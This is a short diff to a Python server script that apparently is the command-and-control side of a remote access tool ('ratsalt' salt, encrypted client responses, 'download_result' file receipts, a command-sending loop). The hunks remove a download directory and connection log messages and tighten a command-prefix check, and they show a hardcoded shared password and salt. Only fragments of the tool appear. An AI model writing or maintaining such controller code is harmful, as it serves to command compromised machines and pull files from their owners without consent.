@@ -19,8 +19,6 @@ def debug_print(message):
 
 SHARED_PASSWORD = b"MyS3cr3tP@ssw0rd!2024"
 SALT = b"ratsalt12345678"
-DOWNLOAD_DIR = "downloads"
-os.makedirs(DOWNLOAD_DIR, exist_ok=True)
 
 clients = {}
 clients_lock = threading.Lock()
@@ -110,7 +108,6 @@ def handle_file_transfer(sock, filename, filesize):
     print(f"[+] Fichier {filename} reçu avec succès.")
 
 def handle_client(client_socket, address):
-    print(f"\n[+] Accepted connection from {address}")
     client_name = f"Client-{address[0]}:{address[1]}"
 
     with clients_lock:
@@ -129,7 +126,7 @@ def handle_client(client_socket, address):
 
                 decrypted_response = decrypt_data(data).decode('utf-8', errors='replace')
 
-                if decrypted_response.startswith("download_result"):
+                if decrypted_response.startswith("download_result "):
                     parts = decrypted_response.split(" ", 2)
                     if len(parts) < 3:
                         print("[!] Mauvais format de commande download_result")
@@ -172,7 +169,6 @@ def handle_client(client_socket, address):
         with clients_lock:
             if client_socket in clients:
                 del clients[client_socket]
-        print(f"[-] Connection with {client_name} ({address}) closed.")
 
 def send_commands():
     while True:
